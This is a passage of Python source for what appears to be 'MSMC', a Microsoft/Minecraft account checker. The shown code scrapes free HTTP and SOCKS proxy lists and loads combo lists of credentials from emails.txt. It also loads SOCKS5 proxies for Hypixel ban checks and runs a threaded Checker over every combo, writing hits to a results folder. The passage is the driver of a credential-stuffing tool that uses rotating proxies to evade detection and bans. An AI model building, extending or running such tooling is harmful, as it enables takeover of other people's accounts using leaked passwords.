            socks4.extend(requests.get(service).text.splitlines())
        except: pass
    for service in api_socks5: 
        try:
            socks5.extend(requests.get(service).text.splitlines())
        except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500").json().get('data'):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500").json().get('data'):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: proxylist.append(proxy)
    for proxy in socks4: proxylist.append(proxy)
    for proxy in socks5: proxylist.append(proxy)

    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'\nScraped [{len(proxylist)}] proxies')
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()

def banproxyload():
    """
    Loads SOCKS5 proxies specifically for ban checking from a user-specified file path.
    """
    global banproxies
    while True:
        file_path = input(Fore.LIGHTBLUE_EX + "Enter the path to your SOCKS5 Ban Checking Proxy file (e.g., ban_proxies.txt): ")
        if not os.path.exists(file_path):
            print(Fore.LIGHTRED_EX + "File not found. Please enter a valid path.")
            continue
        
        try:
            with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        banproxies.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX + f"Loaded [{len(banproxies)}] lines.")
            time.sleep(2)
            break
        except Exception as ex:
            print(Fore.LIGHTRED_EX + f"Your file is probably harmed or has an encoding issue: {ex}")
            time.sleep(2)

def Main():
    """
    Main function to run the MSMC checker.
    Handles user input for settings and orchestrates the checking process.
    """
    global proxytype, screen, Combos, fname
    os.system('clear')
    try:
        loadconfig()
    except Exception as e:
        print(Fore.RED+f"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen MSMC. Error: {e}")
        input("Press Enter to exit.")
        exit()
    print(logo)
    
    # Automatically set threads to 3
    thread = 3 

    print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http/s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
    proxytype_input = input("Enter your choice (1-5): ")
    proxytype = repr(proxytype_input)
    try:
        cleaned = int(proxytype_input)
        if cleaned not in range(1, 6):
            print(Fore.RED+f"Invalid Proxy Type [{cleaned}]")
            time.sleep(2)
            Main()
    except ValueError:
        print(Fore.RED+f"Invalid Proxy Type. Please enter a number.")
        time.sleep(2)
        Main()

    print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
    screen_input = input("Enter your choice (1-2): ")
    screen = repr(screen_input)
    try:
        cleaned_screen = int(screen_input)
        if cleaned_screen not in range(1, 3):
            print(Fore.RED+f"Invalid Screen Type [{cleaned_screen}]")
            time.sleep(2)
            Main()
    except ValueError:
        print(Fore.RED+f"Invalid Screen Type. Please enter a number.")
        time.sleep(2)
        Main()

    fname = "emails"
    file_path = "emails.txt"

    if not os.path.exists(file_path):
        print(Fore.LIGHTRED_EX + f"Error: '{file_path}' not found. Please make sure the file exists in the same directory.")
        input("Press Enter to exit.")
        exit()

    try:
        with open(file_path, 'r+', encoding='utf-8') as e:
            lines = e.readlines()
            Combos = list(set(lines))
            print(Fore.LIGHTBLUE_EX + f"[{str(len(lines) - len(Combos))}] Dupes Removed from {file_path}.")
            print(Fore.LIGHTBLUE_EX + f"[{len(Combos)}] Combos Loaded from {file_path}.")
    except Exception as ex:
        print(Fore.LIGHTRED_EX + f"Error loading '{file_path}': Your file is probably harmed or has an encoding issue: {ex}")
        input("Press Enter to exit.")
        exit()


    if proxytype != "'4'" and proxytype != "'5'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()
    if config.get('proxylessban') == False and config.get('hypixelban') is True:
        print(Fore.LIGHTBLUE_EX+"Select your SOCKS5 Ban Checking Proxies.")
        banproxyload()
    if proxytype =="'5'":
        print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0: 
            time.sleep(1)
    
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)

    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    
    finishedscreen()

if __name__ == "__main__":
    Main()
    input("Program finished. Press Enter to close the console.")
